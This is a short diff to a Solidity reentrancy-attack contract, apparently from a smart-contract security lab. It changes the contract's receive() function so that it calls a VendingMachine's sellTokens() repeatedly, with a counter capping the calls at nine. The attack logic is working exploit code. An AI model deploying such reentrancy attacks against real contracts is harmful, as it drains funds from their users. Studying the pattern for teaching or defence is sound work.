@@ -146,6 +146,7 @@ import {Token} from "./Token.sol";
 contract ReentrancyAttack {
     VendingMachine public vendingMachine;
     Token public token;
+    uint8 counter = 9;
 
     constructor(address _vendingMachine, address _token) {
         vendingMachine = VendingMachine(_vendingMachine);
@@ -161,7 +162,11 @@ contract ReentrancyAttack {
 
     receive() external payable {
         // Executa o ataque de reentrância, chamando `sellTokens` repetidamente enquanto houver saldo
-        if (address(vendingMachine).balance >= vendingMachine.price() && token.balanceOf(address(this)) > 0) {
+        bool victimBalance = address(vendingMachine).balance >= vendingMachine.price();
+        bool contractBalance = counter > 0;
+
+        if (victimBalance && contractBalance) {
+            counter -= 1;
             vendingMachine.sellTokens();
         }
     }
